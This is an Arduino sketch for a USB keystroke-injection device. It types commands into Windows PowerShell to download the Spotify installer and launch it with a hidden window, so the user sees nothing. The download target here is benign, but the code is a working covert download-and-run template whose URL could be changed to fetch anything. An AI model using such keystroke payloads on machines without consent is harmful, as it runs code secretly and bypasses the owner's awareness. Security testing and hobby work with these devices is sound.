// Description: Payload designed to minimise and hide processes while they run in the background. Downloads spotifer installer without showing anything.
#include <Keyboard.h> // Library to access the keyboard

void setup() {
  blink_led();
  Keyboard.begin(); // Initialise the keyboard
  delay(3000); // Delay to ensure that ducky initialises properly
  Payload();
}

// Blink the LED for 20 seconds. Green for the first 40 and red for the final 10. Gives warning for when a payload will execute and time to do re-upload etc.
void blink_led(){
  // Blink LED for the first 20 seconds
  for (int i = 0; i < 20; i++){
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
  }

}
// Helper Function which uses the keyboard library to press and release a key.
void keyboardInput(int key) {
  Keyboard.press(key);
  delay(100); // Small delay to ensure the key press is registered
  Keyboard.release(key);
}

// Helper Function to type any combination of keypresses
void typeKeyCombination(int keys[], int length) {
  for (int i = 0; i < length; i++) {
    Keyboard.press(keys[i]);
  }
  delay(100); // Small delay to ensure all key presses are registered
  for (int i = 0; i < length; i++) {
    Keyboard.release(keys[i]);
  }
}

void Payload() {

  // Common Key Combinations
  int altf4[] = {KEY_LEFT_ALT, KEY_F4}; // Close the application
  int desktop[] = {KEY_LEFT_GUI, 'd'}; // To Desktop: Windows + D
  int run[] = {KEY_LEFT_GUI, 'r'}; // Windows + R (opens run)
  int copycombo[] = {KEY_LEFT_CTRL, 'c'}; // Ctrl C to copy
  int pastecombo[] = {KEY_LEFT_CTRL, 'v'}; // Ctrl V to paste
  int screenshot[] = {KEY_LEFT_GUI, KEY_PRINT_SCREEN}; // Win + Prntscrn

  typeKeyCombination(desktop, 2); // exit to desktop
  delay(1000);
  typeKeyCombination(run, 2); // open run
  delay(1000);
  Keyboard.print("cmd"); // open the cmd
  delay(1000);
  keyboardInput(KEY_RETURN);
  delay(1000);
  
  // access the powershell
  Keyboard.print("powershell"); // access the powershell
  delay(1000);
  keyboardInput(KEY_RETURN);
  delay(1000);

  // Download and run the spotify install exe without having the powershell being shown.

  // install spotify onto the desktop without showing the installer windows. (Hidden)
  Keyboard.print("$desktopPath = [System.IO.Path]::Combine($env:USERPROFILE, 'Desktop')");
  delay(1000);
  keyboardInput(KEY_RETURN);
  delay(1000);
  Keyboard.print("$installerPath = [System.IO.Path]::Combine($desktopPath, 'SpotifySetup.exe')");
  delay(1000);
  keyboardInput(KEY_RETURN);
  delay(1000);
  Keyboard.print("Invoke-WebRequest -Uri \"https://download.scdn.co/SpotifySetup.exe\" -OutFile $installerPath");
  delay(1000);
  keyboardInput(KEY_RETURN);
  delay(10000);
  Keyboard.print("Start-Process -FilePath $installerPath -WindowStyle Hidden");
  keyboardInput(KEY_RETURN);


}

void loop() {
  
}